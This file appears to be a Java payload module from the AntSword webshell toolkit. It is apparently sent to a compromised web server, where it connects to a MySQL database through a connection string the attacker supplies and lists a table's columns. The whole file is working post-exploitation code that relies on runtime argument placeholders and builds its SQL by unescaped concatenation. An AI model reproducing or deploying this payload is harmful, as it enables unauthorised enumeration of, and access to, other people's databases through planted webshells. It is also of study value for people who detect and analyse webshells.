package database.mysql;

import antSword.Template;

import java.sql.*;

public class Show_columns extends Template {

    @Override
    public String run() throws Exception {
        String z1 = new String(this.Base64DecodeToByte("antswordargbin"), this.cs);
        String z2 = new String(this.Base64DecodeToByte("antswordargcmd"), this.cs);
        String z3 = new String(this.Base64DecodeToByte("antswordargdb"), this.cs);
        String z4 = new String(this.Base64DecodeToByte("antswordargtable"), this.cs);
        return showColumns(z1, z2, z3, z4);
    }

    String executeSQL(String encode, String conn, String sql, String columnsep, String rowsep, boolean needcoluname)
            throws Exception {
        String ret = "";
        String[] x = conn.trim().replace("\r\n", "\n").split("\n");
        Class.forName(x[0].trim());
        String url = x[1] + "&characterEncoding=" + encode;
        Connection c = DriverManager.getConnection(url);
        Statement stmt = c.createStatement();
        ResultSet rs = stmt.executeQuery(sql);
        ResultSetMetaData rsmd = rs.getMetaData();

        if (needcoluname) {
            for (int i = 1; i <= rsmd.getColumnCount(); i++) {
                String columnName = rsmd.getColumnName(i);
                ret += columnName + columnsep;
            }
            ret += rowsep;
        }

        while (rs.next()) {
            for (int i = 1; i <= rsmd.getColumnCount(); i++) {
                String columnValue = rs.getString(i);
                ret += columnValue + columnsep;
            }
            ret += rowsep;
        }
        return ret;
    }

    String showColumns(String encode, String conn, String dbname, String table) throws Exception {
        String columnsep = "\t";
        String rowsep = "";
        String sql = "select * from `" + dbname + "`.`" + table + "` limit 0,0";
        return executeSQL(encode, conn, sql, columnsep, rowsep, true);
    }
}